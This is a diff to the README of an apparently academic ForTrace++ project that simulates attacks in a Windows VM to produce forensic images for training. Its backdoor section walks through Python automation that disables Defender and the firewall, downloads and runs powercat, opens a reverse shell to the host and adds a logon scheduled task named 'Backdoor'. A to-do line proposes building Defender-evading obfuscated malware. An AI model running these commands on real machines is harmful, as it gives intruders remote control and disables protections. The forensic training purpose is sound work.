@@ -375,49 +375,279 @@ This scenario simulates a simple case where a laptop is left unattended. An atta
 - **Execution:**
   1. **Initial State:** The laptop is powered on but left unattended.
   2. **Attack:** A script is automatically triggered (via scheduled tasks or other triggers) to establish a remote connection.
-  3. **Backdoor Installation:** A Python-based exploit installs a persistent backdoor (e.g., as a hidden service).
+  3. **Backdoor Installation**: The reverse shell is executed immediately, and a scheduled task is created to re-establish the connection upon user logon
   4. **Logging:** All actions (connection, installation, system registration) are recorded in log files.
+
 - **Forensic Artifacts:**
   - Log entries documenting the time and process of backdoor installation.
   - System modifications (new services, changed configurations).
-    - Can be found by analysing created Image dump of the Scenario VM
-    - Files are usally automatically created at the end of the scenario execution and save at `/var/tmp/SCENARIO_NAME/VM_NAME`
-    - `scenario_1.elf` --> analyze with Autopsy
+  - Can be found by analyzing the created Image dump of the Scenario VM
+  - `scenario_1.raw` --> convert to `.E01` and analyze with Autopsy or Magnet AXIOM
   - Network connections evidencing remote access.
-    - .pcapng-File
+    - A .pcapng file that records all network communication during scenario execution
     - Can be analyzed using Wireshark
     - Contains all network traffic during scenario execution
 
-**Technical Implementation:**
-- Install netcat on Host-System: `sudo pacman -S netcat`
-  - `nc -lvnp 4444` listen on port and wait for the connection of the Windows VM Target
-- Prerequisite for the Windows VM:
-  - I. Best Solution would be to deactivate Windows Defender completely already in the `autounattend.xml`
-  - II. Disabling Defender via Registry (afterwards)
-  - mandatory since the signature of the ReverseShell used is already well-known
-  - **Tamper Protection**
-    - Windows 10/11 includes Tamper Protection, which prevents Defender settings from being changed.
-    - Disable tamper protection manually first before running these commands.
-    - ![tamper protection](pictures/tamper.png)
+> **Note**: The Image Dump (.raw files) are automatically created at the end of the scenario execution and saved at the following path `/var/tmp/SCENARIO_NAME/VM_NAME`, if the `dump_image` is set to `True` in the YAML-Configuration
 
-```ps1
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
-```
+> **Note for the Network Dump**: The .pcap-File is created if the `start_sniffer` is set to `True`
+--- 
+**Technical Implementation**
+
+- **Host System Preparation:**
+  - Install netcat (or a similar tool) on the host system (e.g. using `sudo pacman -S netcat`)
+  - On the host, start a listener to await incoming reverse shell connections:
+  ```
+  nc -lvnp 4444
+  ```
+  - Configure firewall on Linux host:
+    ```bash
+    # Identify network zones
+    sudo firewall-cmd --get-active-zones
+    # Sample output:
+    # libvirt
+    # interfaces: virbr0
+    # public (default)
+    # interfaces: wlan0
+    
+    # Add firewall rules
+    sudo firewall-cmd --zone=libvirt --add-port=4444/tcp --permanent
+    sudo firewall-cmd --zone=libvirt --add-interface=virbr0 --permanent
+    sudo firewall-cmd --reload
+    
+    # Verify the rules
+    sudo firewall-cmd --list-all --zone=libvirt
+    ```
+
+> ✔ Limits access to port 4444 so that only the Windows VM can connect
+
+> ✔ Ensures Linux host remains protected from other network attacks
+
+**Prerequisites for the Windows VM:**
+
+It is recommended that Windows Defender is deactivated for the VM prior to deployment. This can be achieved via the autounattend.xml configuration or by disabling Defender manually through registry modifications.
+Since the signature of the ReverseShell used is already well-known and detected, disabling the Windows Defender is mandatory.
+
+**Deactivate Windows Defender - prior deployment (Recommended)** 
+
+The Windows VM requires specific preparation to ensure proper scenario execution. This is accomplished through a customized Windows installation using `autounattend[disabled windows defender][BIOS].xml` which includes the following tweaks:
+
+- **Improved Performance**: Custom ISO with performance tweaks and debloating
+- **Windows Defender Disabled**: Disables Defender services (Sense, WdBoot, WdFilter, WdNisDrv, WdNisSvc, WinDefend) during Windows PE setup stage of Windows Setup and thus prevents the MsMpEng.exe process from running.
+- **File Explorer Enhancements**:
+  - Always show file extensions for known file types
+  - By default, File Explorer would hide extensions for known file types.
+  - Show all files, including protected operating system files (files that have the Hidden or the System attribute set)
+- **Privacy Improvements**:
+  - No Bing results when searching in Start menu
+  - Disable app suggestions / Content Delivery Manager
+  - Hide Edge First Run Experience
+- **PowerShell Configuration**: Sets `ExecutionPolicy` to `RemoteSigned` to allow execution of unsigned .ps1 files
+- **System Optimization**:
+  - Turned off system sounds
+  - Disabled Enhance Pointer Precision mouse setting
+
+> Note: Windows Update can be optionally disabled by creating a scheduled task (named PauseWindowsUpdate) that continuously pauses updates, though this is not configured in the current XML.
+
+**Disabling Defender via Registry - after initial deployment**
+- **Tamper Protection**: Windows 10/11 includes Tamper Protection, which prevents Defender settings from being altered. This protection must be disabled manually before applying registry modifications:
+  ![tamper protection](pictures/tamper.png)
+  ```powershell
+  Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
+  ```
+- **Windows Firewall**: Should be disabled to allow the reverse shell connection:
+  ```powershell
+  Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+  ```
 > Notice: Windows may require a reboot for changes to take effect.
 
+**Testing the ReverseShell**
+
+While the scenario uses a direct download approach, Powercat can also be side-loaded using:
+```powershell
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+```
+
+The reverse shell command with verbose output:
+```powershell
+powercat -c 192.168.122.1 -p 4444 -e cmd.exe -Verbose
+```
+
+> **ReverseShell in action**
+![](pictures/reverse_shell_windows.png)
+![](pictures/reverse_shell_linux.png)
+
+---
+#### Explaination of the scenario1.py and scenario1.yaml
+**Initialization Block**
+```python
+import pathlib
+from time import sleep
+import numpy.random
+from fortrace.core.simulation_monitor import SimulationMonitor
+from fortrace.core.virsh_domain import GraphicalVirshDomain
+from fortrace.fortrace_definitions import FORTRACE_ROOT_DIR
+from fortrace.utility.applications.application import ApplicationType
+from fortrace.utility.applications.console.powershell import PowerShell
+from fortrace.utility.logger_helper import setup_logger
+
+# Initialize logger using ForTrace++ logging helper
+logger = setup_logger(__name__)
+```
+- Imports necessary libraries
+- Sets up logging for the scenario
+
+**Main Scenario Function**
+```python
+def scenario_1():
+    monitor = SimulationMonitor(
+        pathlib.Path(
+            FORTRACE_ROOT_DIR,
+            "scenarios/scenario1-backdoor/scenario1.yaml",
+        )
+    )
+    domain = monitor.participant[0].domain  # type: GraphicalVirshDomain
+    config = monitor.participant[0].config
+
+    # Boot the Windows 10 VM with the provided snapshot and network settings.
+    domain.boot(
+        start_sniffer=config["domain"]["start_sniffer"],
+        snapshot=config["domain"]["snapshot"],
+    )
+
+    # Log in to the system using credentials specified in the configuration.
+    domain.env.login(config["domain"]["username"], config["domain"]["password"])
+
+    # Log the unattended state of the system.
+    logger.info("System state: Unattended Windows 10 machine, awaiting attacker action.")
+
+    # Execute the backdoor installation scenario.
+    backdoor_scenario(domain, config)
+
+    # Post-scenario actions such as log consolidation and image dump processing.
+    monitor.post_scenario()
+```
+- Initializes simulation monitor with YAML config
+- Boots VM using specified snapshot
+- Logs in with credentials from config
+- Executes backdoor installation
+- Performs post-scenario actions (logs and image dump)
+
+**Backdoor Installation Function Start**
+```python
+def backdoor_scenario(domain: GraphicalVirshDomain, config: dict):
+    # Log the initiation of the backdoor installation.
+    logger.info("Attacker: Initiating unauthorized remote access via backdoor installation on Windows 10.")
+
+    # Open a PowerShell instance with elevated privileges.
+    ps = domain.env.open_application(
+        ApplicationType.TERMINAL, "Windows PowerShell", run_as_administrator=True
+    )  # type: PowerShell
+    sleep(2)  # Allow the PowerShell window to fully initialize.
+```
+- Logs attack initiation
+- Opens PowerShell with admin privileges
+- Waits for PowerShell initialization
+
+**Step 1: Download Powercat Payload**
+```python
+    # Step 1: Download the Powercat payload and save it in a secure directory.
+    ps.send_command(r"$Destination = 'C:\ProgramData\powercat.ps1'", get_output=False)
+    sleep(1)
+    ps.send_command(r"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' -OutFile $Destination", get_output=False)
+    sleep(2)
+```
+- Sets destination path for Powercat payload
+- Downloads Powercat script using Invoke-WebRequest
+- Used the github project [powercat](https://github.com/besimorhino/powercat) (Netcat: The powershell version) to establish the ReverseShell
+- Creates first forensic artifact (downloaded file)
+
+**Step 2: Load Powercat into Memory**
+```python
+    # Step 2: Dot-source the downloaded script to load the 'powercat' function into memory.
+    ps.send_command(r". C:\ProgramData\powercat.ps1", get_output=False)
+    sleep(1)
+```
+- Dot-sources the Powercat script
+- Loads Powercat function into current PowerShell session
+- Creates memory-based artifact
+
+**Step 3: Execute Reverse Shell**
+```python
+    # Step 3: Execute the reverse shell immediately using the loaded function.
+    attacker_ip = config["backdoor"]["attacker_ip"]
+    reverse_shell_command = rf"powercat -c {attacker_ip} -p 4444 -e cmd.exe"
+    ps.send_command(reverse_shell_command, get_output=False)
+```
+- Gets attacker IP from config
+- Creates reverse shell command with Powercat
+- Executes command to establish connection to attacker
+- Creates network traffic artifact
+
+**Step 4: Create Persistence Mechanism**
+```python
+    # Step 4: Create a scheduled task to ensure persistence at user logon.
+    ps.send_command(rf'schtasks /create /tn "Backdoor" /tr "{reverse_shell_command}" /sc onlogon /f', get_output=False)
+    sleep(2)
+```
+- Creates scheduled task named "Backdoor"
+- Sets task to run at each user logon
+- Establishes persistence mechanism
+- Creates significant forensic artifact in Task Scheduler
+
+**YAML Configuration Elements**
+```yaml
+name: Scenario 1 Backdoor
+description: Configuration file for the first Scenario. Unauthorized Remote Access via Backdoor
+author: Clasen, Tim
+collections:
+  root: /var/tmp/ForTrace_scenario_1
+  overwrite_root: True
+domain:
+  username: "fortrace"
+  password: "fortrace"
+  name: "win10_defender"
+  network: "default"
+  os_type: OSType.WINDOWS
+  desktop_env: DesktopEnvironmentType.Windows_10
+  start_sniffer: False
+  snapshot: "clean_install"
+  dump_images: True
+explorer:
+  path: 'C:\Users\fortrace\Desktop\'
+backdoor:
+  attacker_ip: "192.168.122.1"
+```
+- Defines scenario parameters
+- Sets VM credentials (`fortrace`/`fortrace`)
+- Specifies VM snapshot (`clean_install`)
+- Enables image dumping for forensic analysis
+- Sets attacker IP (`192.168.122.1`)
+- Defines output directory (`/var/tmp/ForTrace_scenario_1`) (used for saving the Image Dumps)
 
 
-**Usage:**
-  - copy the `.yaml` and `.py` files from the folder `scenario1-backdoor/` to your fortrace installation folder
-  - and create a folder so it looks like that:
-![folder](pictures/folder-structure1.png)  
-  - start the virtual environment and run the `scenario1.py`: 
-```
-source .venv/bin/activate
-python scenarios/scenario1.py
-```
-**(Optional)**: Observe the automation process through virt-manager as it interacts with the VM. 
-> **Important**: Do not interact with the VM during the automation process.
+**Usage Instructions**
+1. Copy the Python file (`scenario1.py`) and the YAML configuration file (`scenario1.yaml`) from the folder `scenario1-backdoor/` to the appropriate location within the ForTrace++ installation directory
+2. The folder structure should resemble the following:
+   ```
+   fortrace/
+     ├── scenarios/
+     │    └── scenario1-backdoor/
+     │           ├── scenario1.py
+     │           └── scenario1.yaml
+     └── .venv/
+   ```
+3. Activate the Python virtual environment and execute the scenario:
+   ```
+   source .venv/bin/activate
+   python scenarios/scenario1-backdoor/scenario1.py
+   ```
+4. Simultaneously, on the host system, start the Netcat listener:
+   ```
+   nc -lvnp 4444
+   ```
+5. It is imperative that no manual interaction occurs with the VM during the automation process to maintain the integrity of the scenario
+> **(Optional)**: Observe the automation process through virt-manager as it interacts with the VM. 
 ---
 
 ### Scenario 2: Medium – Exfiltrate Passwords from the SQLite Database of the Webbrowser
@@ -474,31 +704,122 @@ For all scenarios, the following artifacts are expected:
 
 Forensic analysis (e.g., via Autopsy) should reconstruct the exact attack flow and identify the techniques used.
 
+### Converting `.raw` to `.e01` on EndeavourOS
+
+This process is particularly useful for forensic analysis with tools such as **Autopsy** and **Magnet AXIOM**.
+
+#### Prerequisites
+To convert a `.raw` disk image to the `.e01` (Expert Witness Format) on EndeavourOS, the `libewf` package is required, which provides the necessary tools.
+
+#### Install `libewf`
+On EndeavourOS (Arch-based), install `libewf` using `yay`:
+
+```bash
+yay -S libewf
+```
+
+If `yay` is not available, install it first:
+
+```bash
+git clone https://aur.archlinux.org/yay-bin.git
+cd yay-bin
+makepkg -si
+```
+
+Then, retry installing `libewf`.
+
+#### Converting `.raw` to `.e01`
+Once `libewf` is installed, either `ewfconvert` or `ewfacquire` can be utilized.
+
+#### Option 1: Using `ewfconvert`
+This is the simplest method to convert an existing `.raw` image to `.e01`:
+
+```bash
+ewfconvert input.raw output.e01
+```
+
+#### Option 2: Using `ewfacquire`
+For interactive acquisition, including the addition of metadata, the following command can be executed:
+
+```bash
+ewfacquire -t output.e01 input.raw
+```
+
+Upon execution, prompts will request details such as case number, description, and examiner name.
+
+#### Verifying the `.e01` Image
+After conversion, verification of the `.e01` file integrity can be performed using:
+
+```bash
+ewfinfo output.e01
+```
+
+This command will display metadata and confirm the proper formatting of the file.
+
 ---
 
 ## Summary and Conclusion
 
-This documentation outlines three different attack scenarios that can be simulated with ForTrace++ in a Windows VM:
+This documentation has detailed three distinct attack scenarios that have been simulated using ForTrace++ in a Windows virtual machine. The scenarios provide insight into common attack 
+vectors while producing forensic artifacts that are valuable for research and forensic training.
 
+### Overview of Scenarios
 1. **Backdoor Installation:**
    Demonstrates how a physical attack in an unsecured environment can lead to persistent remote access.
+    - This scenario simulates a situation in which an unattended Windows 10 machine is exploited to install a persistent reverse shell. The attack script downloads the Powercat payload, dot-sources it to load the function into memory, executes a reverse shell immediately, and creates a scheduled task that re-launches the reverse shell upon user logon.  
 
 2. **Password Exfiltration from Browser Databases:**
    Highlights the risks of storing passwords insecurely in browsers and underscores the necessity of using secure password managers.
 
-3. **Word Macro Ransomware:**
-   Shows how malicious macros in Office documents can encrypt critical data, disrupting business operations.
+3. **File Encryption (Ransomware-like Behavior):**
+   Shows how malicious and disguised programs can encrypt critical data, disrupting business operations.
 
 These scenarios provide both a practical insight into common attack vectors and valuable case studies for forensic analysis. The combination of YAML configuration and Python automation with ForTrace++ ensures a repeatable and controlled workflow—ideal for training and research purposes.
 
 **Outlook:**
 - Further development of automation scripts to simulate even more realistic attack scenarios.
-- Integration of additional analysis tools for advanced forensic investigation.
+- Incorporate additional steps into the scenario, such as using an email client to receive an email containing a Word document with a malicious macro.
 - Evaluation and comparison of results with real-world attack data.
+
+### Evaluation and Usability of ForTrace++
+
+ForTrace++ has proven to be a powerful framework for simulating complex attack scenarios in a controlled virtual machine environment. The following points summarize the evaluation and usability aspects:
+
+### Environment Preparation
+- **Multiple manual configuration steps** required for VM simulation
+- **Manual processes** necessary (disabling Windows Defender, network configuration)
+- **Improvement potential** through increased automation
+  - Some possible Improvements are described in this documentation
+  - Such as the preconfiguration of the Windows ISO with `unattend.xml`
+  - Or the use of shell scripts to automate the VM creation with libvirt
+- **User experience** may be hindered by complex setup requirements
+
+### Documentation Quality
+- **Documentation complexity** impedes rapid onboarding
+- **Function usage sometimes unclear** (e.g., [PowerShell interface](https://fortrace.readthedocs.io/en/latest/source/fortrace.utility.applications.console.html#module-fortrace.utility.applications.console.powershell))
+- **Example scenarios** were in some cases more instructive than formal documentation
+  - Would be nice to have a direct example use inside the documentation for better understanding how to use it in own scenarios
+- **Steep learning curve** for users with limited Python experience
+
+### Efficiency Analysis
+- **Time investment** higher for scenario creation than manual image preparation
+- **Benefits realized** primarily with complex, reusable scenarios
+- **Initial setup overhead** significant despite automation framework
+- **Cost-benefit ratio** favorable only for repeated, complex forensic scenarios
+
+### Error Handling Limitations
+- **Error output lacks sometimes of sufficient detail** for effective troubleshooting
+- **Debugging complexity** increased by documentation limitations
+- **Troubleshooting guidance** inadequate for novice users
+- **Error causes often unclear** leading to unresolvable issues
+- For example the error at the next section: General Troubleshooting
 
 --- 
 ## General Troubleshooting
 - If you encounter these Errors while working with Fortrace++ it's propably because the VM doesn't have enough RAM (minimum: 8192 MiB)
+  - **Update:** It happens again and again, so it's probably not due to too little RAM, as it now occurs despite the 8 GiB RAM.
+  - The reason for the error has not yet been determined. 
+  - However, it seems to be related to the laptop or the Fortrace installation, as it seems to work on the alternative laptop (with more resources)
 ```py
 Traceback (most recent call last):
   File "/home/user/fortrace/scenarios/scenario1-backdoor/scenario1.py", line 104, in <module>
@@ -518,7 +839,6 @@ Traceback (most recent call last):
         bounding_boxes, key=lambda x: x[0]
     )  # take the bounding box that is more to the right
 ValueError: max() iterable argument is empty
-
 ```
 
 ## Potential Improvements (To-Do)
@@ -526,5 +846,6 @@ ValueError: max() iterable argument is empty
   - allow the PowerShell Execution Policy
   - automatic Install of the Windows SPICE Guest Tools
   - deactivate Windows Defender already in the ISO, so the Malware Examples work without interruption
+- Development of Malware that is not already detected by Windows Defender by using obfuscation techniques.
 
 ---
